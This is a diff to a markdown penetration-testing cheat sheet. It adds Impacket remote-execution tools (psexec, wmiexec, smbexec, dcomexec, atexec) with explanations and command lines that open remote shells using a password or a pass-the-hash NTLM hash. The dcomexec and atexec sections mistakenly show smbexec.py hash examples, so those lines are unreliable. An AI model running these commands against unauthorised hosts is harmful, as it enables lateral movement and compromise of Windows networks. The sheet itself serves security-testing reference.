@@ -28,8 +28,11 @@
   - [smbclient](#smbclient)
   - [psexec-py](#psexec-py)
   - [wmiexec-py](#wmiexec-py)
-  - [Snaffler](#Snaffler)
+  - [smbexec-py](#smbexec-py)
+  - [dcomexec-py](#dcomexec-py)
+  - [atexec-py](#atexec-py)
   - [smbserver-py](#smbserver-py)
+  - [Snaffler](#Snaffler)
   - [setspn exe](#setspn-exe)
   - [Mimikatz](#Mimikatz)
   - [kekeo](#kekeo)
@@ -540,6 +543,35 @@ Part of the Impacket toolkit, it provides us with Psexec-like functionality in t
 ```
 https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
 ```
+```
+https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/
+```
+
+This method is very similar to the traditional PsExec from SysInternals. In this case, however, Impacket uses RemComSvc utility.
+
+The way it works is that Impacket will upload the RemComSvc utility on a writable share on the remote system and then register it as a Windows service.
+
+This will result in having an interactive shell available on the remote Windows system via port tcp/445.
+
+“You have to have administrator to PSExec.”
+
+Requirements for PSExec
+
+1. Write a file to the share.
+2. Create and start a service.
+
+basic example usage:
+```
+psexec.py <domain>/<user>:<password>@<ip$>
+```
+
+
+example using a hash (the hash is an example)
+```
+psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e21bf3dfb1cb61fa095b40fb083149cf <user>@<ip$>
+```
+
+
 
 ### wmiexec-py
 Part of the Impacket toolkit, it provides the capability of command execution over WMI.
@@ -547,6 +579,91 @@ Part of the Impacket toolkit, it provides the capability of command execution ov
 ```
 https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
 ```
+```
+https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/
+```
+basic example usage:
+```
+wmiexec.py <domain>/<user>:<password>@<ip$>
+```
+
+
+example using a hash (the hash is an example)
+```
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e21bf3dfb1cb61fa095b40fb083149cf <user>@<ip$>
+```
+
+### smbexec-py
+
+Smbexec.py method takes advantage of the native Windows SMB functionality to execute arbitrary commands on the remote system.
+
+This approach does not require anything to be uploaded on the remote system and is therefore somewhat less noisy.
+
+Note that the communication happens solely over port tcp/445.
+
+Smbexec.py uses a similar approach to psexec w/o using RemComSvc. This script works in two ways:
+
+*    share mode: you specify a share, and everything is done through that share.
+*    server mode: if for any reason there’s no share available, this script will launch a local SMB server, so the output of the commands executed is sent back by the target machine into a locally shared folder. Keep in mind you would need root access to bind to port 445 in the local machine.
+
+
+basic example usage:
+```
+smbexec.py <domain>/<user>:<password>@<ip$>
+```
+```
+https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/
+```
+
+example using a hash (the hash is an example)
+```
+smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e21bf3dfb1cb61fa095b40fb083149cf <user>@<ip$>
+```
+
+### dcomexec-py
+Dcomexec.py method uses various DCOM endpoints such as MMC20.Application, ShellWindows or ShellBrowserWindow objects to spawn a semi-interactive shell on the remote system.
+
+Using this method requires communication on multiple network ports (tcp/135, tcp/445) and internally utilizes the DCOM subsystem of the remote Windows system using a dynamically allocated high port such as tcp/49751
+
+This generally makes this method somewhat more noisy that the other methods.
+
+basic example usage:
+```
+dcomexec.py <domain>/<user>:<password>@<ip$>
+```
+```
+https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/
+```
+
+example using a hash (the hash is an example)
+```
+smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e21bf3dfb1cb61fa095b40fb083149cf <user>@<ip$>
+```
+
+### atexec-py
+atexec.py uses the Task Scheduler service (Atsvc) on the remote Windows system to execute a supplied command. All network communication takes place over port tcp/445.
+
+basic example usage:
+```
+atexec.py <domain>/<user>:<password>@<ip$>
+```
+example using a hash (the hash is an example)
+```
+smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e21bf3dfb1cb61fa095b40fb083149cf <user>@<ip$> systeminfo
+```
+
+
+### smbserver-py
+Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.
+
+```
+https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py
+```
+```
+https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/
+```
+
+
 
 ### Snaffler
 Useful for finding information (such as credentials) in Active Directory on computers with accessible file shares.
@@ -555,12 +672,6 @@ Useful for finding information (such as credentials) in Active Directory on comp
 https://github.com/SnaffCon/Snaffler
 ```
 
-### smbserver-py
-Simple SMB server execution for interaction with Windows hosts. Easy way to transfer files within a network.
-
-```
-https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py
-```
 
 ### setspn-exe
 Adds, reads, modifies and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.
